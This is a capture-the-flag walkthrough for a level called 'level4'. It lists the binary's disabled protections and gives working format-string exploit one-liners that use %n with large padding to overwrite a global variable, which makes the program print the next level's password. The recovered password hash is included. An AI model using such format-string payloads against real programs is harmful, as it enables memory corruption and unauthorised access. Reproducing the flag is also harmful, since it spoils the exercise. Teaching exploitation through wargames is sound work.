# level4

## Header

```bash
ssh level4@192.168.64.9 -p 4242
...
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
```

<hr>

## Solution

The main principle is the same as in the [level3](./../level3/walkthrough.md), but `m` here should be equal to `0x1025544`  (`16930116` in decimal), so we just need to make a huge padding... 

As the program will call `system("/bin/cat /home/user/level5/.pass")`, we don't need to keep stdin opened, and that makes solution even more simple:

```bash
echo -n $'\x10\x98\x04\x08%16930112c%12$n' | ./level4
# or
printf '\x10\x98\x04\x08%%16930112c%%12$n' | ./level4
# or
python -c 'print "\x10\x98\x04\x08%16930112c%12$n"' | ./level4

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

## References
- [OWASP - format string attack](https://owasp.org/www-community/attacks/Format_string_attack)